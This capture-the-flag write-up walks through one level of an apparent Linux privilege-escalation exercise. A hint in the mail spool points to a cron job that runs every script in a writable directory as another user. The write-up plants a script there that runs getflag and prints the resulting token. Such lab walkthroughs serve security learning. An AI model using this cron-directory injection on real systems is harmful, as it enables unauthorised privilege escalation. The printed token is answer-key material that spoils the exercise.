# Level05

## Solution

We are given a small hint when we log in.

```
You have new mail.
```

Let's look for files related to mail and level05.

```
$ find / 2>/dev/null | grep "mail" | grep "level05"
/var/mail/level05
/rofs/var/mail/level05
```

Let's see what these files contain.

```
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

We see a cron job running every 2 minutes, and we also see that it executes ``/usr/sbin/openarenaserver``. Let's take a look at what this script contains.

```
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

We can see that the script executes all the files located in ``/opt/openarenaserver`` All that remains is to add our executable.

```
$ echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/flag
$ chmod +x /opt/openarenaserver/flag
$ cat /opt/openarenaserver/flag
/bin/getflag > /tmp/flag
$ ls -l /opt/openarenaserver/
total 4
-rwxrwxr-x+ 1 level05 level05 25 Dec 13 23:20 flag
```

With these commands, we create an executable ``flag`` that will launch ``/bin/getflag`` and put the output in ``/tmp/flag``. We also give it permissions.

```
$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

And when it is run, we can see that the token is found in ``/tmp/flag``.
